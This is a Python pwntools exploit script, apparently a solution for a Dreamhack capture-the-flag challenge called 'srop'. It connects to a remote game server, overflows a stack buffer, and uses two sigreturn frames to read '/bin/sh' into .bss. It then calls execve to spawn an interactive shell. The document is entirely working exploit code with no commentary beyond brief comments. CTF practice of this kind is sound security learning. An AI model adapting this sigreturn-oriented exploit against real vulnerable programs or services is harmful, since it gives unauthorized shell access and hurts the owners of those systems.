from pwn import *

p = remote("host1.dreamhack.games", 12276)
# p = process('./srop')
e = ELF('./srop')

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

# if you don't write this.. error...
context.arch = "x86_64"
context.log_level = 'debug'

# gdb.attach(p)

gadget = next(e.search(asm("pop rax; syscall")))
syscall = next(e.search(asm("syscall")))

bss = e.bss()

# print(gadget)
slog("gadget", gadget)
slog("bss", bss)

buf2ret = 0x18
binsh = b"/bin/sh\x00"

#exploit[1] - read "/bin/sh"
# read(0, bss, 0x1000)
exploit = b"A"*buf2ret
exploit += p64(gadget)
exploit += p64(0xf)

#set stack for register
frame = SigreturnFrame()
frame.rax = 0        # SYS_read
frame.rsi = bss
frame.rdx = 0x1000
frame.rdi = 0
frame.rip = syscall
frame.rsp = bss
exploit += bytes(frame)

p.sendline(exploit)

#exploit[2] - execve("/bin/sh")
exploit2 = p64(gadget)
exploit2 += p64(15)

#set stack for register
frame2 = SigreturnFrame()
frame2.rax = 0x3b #SYS_execve
frame2.rdi = bss+0x108
frame2.rip = syscall
exploit2 += bytes(frame2)
exploit2 += binsh

p.sendline(exploit2)

p.interactive()